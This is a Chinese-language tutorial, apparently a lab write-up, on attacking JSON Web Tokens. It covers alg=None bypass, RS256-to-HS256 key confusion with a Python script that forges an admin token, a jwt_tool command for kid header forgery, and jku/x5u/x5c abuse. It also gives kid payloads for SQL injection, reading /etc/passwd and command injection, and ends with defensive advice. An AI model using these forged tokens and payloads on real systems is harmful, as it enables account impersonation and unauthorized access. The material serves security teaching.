简介

jwt全称json web token，是一种使用json为数据载体，通过对称与非对称对数据进行加密，可以保证数据传输的时候不被篡改，一般用于认证 Authentication与授权 Authorization。

jwt格式
Header 声明算法及其他参数.
payload 声明各种数据，明文传输，如id、user等.
Signature 对header和payload进行签名，签名方式在heder的alg中

空算法验证

对alg进行Base64解码，将alg赋值为None

如果返回正常，则存在该漏洞


直接将alg赋值为空，也是一样返回正常。

修改payload字段，伪造其他用户。

{"name":"iak"} -> {"name":"admin"}


未验证签名内容 （细心的师傅会在2看见，我已经删除了Signature部分）

eyJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ==.

将泄漏的 PublicKey 保存至本地（注意保存格式，不要有缩进），利用jwt_tool进行密钥混淆，将加密方式由RS256混淆为HS256(属于HMAC)，就可以使加密解密使用同一个密钥，此时服务后端会发现Header是HS256加密后，会使用 PublicKey 验证。

手动修改签名，将密钥读取成一行，加密得到hash，用base64编码hash值，再用 eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ 去签名，得到最终签名。

eyJhbGciOiAiSFMyNTYifQ.eyJuYW1lIjogImFkbWluIn0.oGlSeH0wBAk7WMn1VrtxZHx_yat1QUukiLN0sVP7J0o
import hmac
import hashlib
import base64


file = open('pub_key')
key = file.read()

# Paste your header and payload here
header = '{"alg": "HS256"}'
payload = '{"name": "admin"}'

# Creating encoded header
encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")

# Creating encoded payload
encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")

# Concatenating header and payload
token = (encodeHeader + "." + encodePayload)

# Creating signature
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

print(token + "." + sig)

漏洞原因是，可以指定alg算法。后端收到的jwt是私钥解密(RSA256)，修改发送数据的加密算法为HS256，后端识别到加密算法为HS256，于是使用PublicKey签名进行解密，此时就篡改了数据。

五、Vulnerable Kid

存在的漏洞

kid伪造漏洞 按照作者的意思，生成一个随机界面，然后将返回的文件路径作为kid的值

python3 jwt_tool.py <jwt> -I -hc kid -hv "app/views/authentication/random.html.erb" -pc name -pv "admin" -S hs256 (必须要制定加密算法)

该漏洞原因是，我们可以伪造kid的值，指定一个我们已知的服务器上存在文件，此时再次尝试篡改数据，由于密钥验证失效，即可达到伪造jwt的目的。


补充

jku/x5u/x5c

JKU全称“JWKSet URL”，类似上述的kid，在Header中远程指定密钥文件，通常格式为{"typ": "JWT","alg": "HS256","jku":"http://iak.ink/jwks.json"}

漏洞利用

https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c

X5U与JKU相同，同样是在Header中指定远程验证的密钥文件，其区别就在于密钥的格式不同，常见格式为{"typ": "JWT","alg": "HS256","x5u":"http://iak.ink/jwks.crt"}

X5C与X5U密钥格式相同，其不同之处是在Header中直接传输了密钥的内容，格式为{"typ": "JWT","alg": "HS256","x5c":"密钥内容"}

SQL注入

在jwt传输过程中，如果将敏感信息为加密放在了header、payload中被解密可能会导致如下漏洞：

{"kid":"test' UNION SELECT 'adminkey'；--","alg": "HS256"}
当不存在test这个索引时，会设置成adminkey为解密的密钥

不仅限于……
{"kid":"/etc/passwd","alg": "HS256"} #文件读取
{"kid":"/etc/passw|whoami","alg": "HS256"} #命令执行

JWT安全建议

  1. 避免在jwt传输过程中存在敏感数据及参数。
  2. 使用对称加密算法，应使用强口令。
  3. 使用非对称加密算法，应在服务端增加已授权算法的白名单，限制签名算法类型，防止密钥混淆攻击。
  4. 验证并过滤从用户端接收的数据，例如kid、jku等关键参数，防止因没有对参数进行正确校验而产生的安全风险。
  5. 在Payload字段中增加一些业务上的字段，用于校验当前JWT是否被滥用，例如增加设备号、权限的信息等，可以与上下文的信息进行对照。
